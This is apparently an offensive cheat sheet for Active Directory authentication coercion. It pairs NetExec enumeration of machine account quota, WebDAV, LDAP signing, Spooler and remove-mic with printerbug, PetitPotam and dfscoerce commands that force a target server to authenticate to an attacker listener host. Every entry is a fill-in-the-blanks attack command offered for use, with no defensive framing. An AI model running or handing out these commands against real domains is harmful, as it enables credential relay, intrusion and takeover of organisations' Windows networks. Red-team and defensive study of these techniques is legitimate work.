# coercion
#target/remote #os/linux #cat/ad

## Enumerate MAQ
```
nxc ldap <ip> -u '<user>' <auth> -M maq
```

## Enumerate WebDAV
```
nxc smb <ip> -u '<user>' <auth> -M webdav
```

## Enumerate LDAP signing
```
nxc ldap <ip> -u '<user>' <auth> -M ldap-checker
```

## Enumerate Spooler service NetExec
```
nxc smb <ip> -u '<user>' <auth> -M spooler
```

## Enumerate Spooler service rpcdump
```
rpcdump.py <ip> | egrep 'MS-RPRN|MS-PAR'
```

## Drop The Mic/Remove Mic
```
nxc smb <ip> -u '<user>' <auth> -M remove-mic
```

## printerbug
```
printerbug.py <domain>/'<user>'<auth> <lhost>
```

## petitpotam
```
PetitPotam.py -d <domain> -u '<user>' <auth> <lhost> <ip>
```

## dfscoerce
```
dfscoerce.py -d <domain> -u '<user>' <auth> <lhost> <ip>
```
